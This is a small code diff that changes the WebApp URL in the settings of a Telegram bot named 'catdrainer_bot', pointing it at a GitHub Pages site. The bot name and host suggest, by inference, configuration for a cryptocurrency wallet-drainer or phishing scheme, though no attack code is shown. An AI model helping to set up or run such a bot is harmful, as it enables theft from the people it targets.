@@ -9,7 +9,7 @@ BOT_USERNAME = "catdrainer_bot"
 CHAT_ID = "-1002262089486"
 
 # 🔹 WebApp URL (Replace with your Render URL after deployment)
-WEB_APP_URL = "https://refunding212.github.io/forrealcat/"
+WEB_APP_URL = "https://refunding212.github.io/forealcat/"
 
 # Enable logging
 logging.basicConfig(level=logging.INFO)
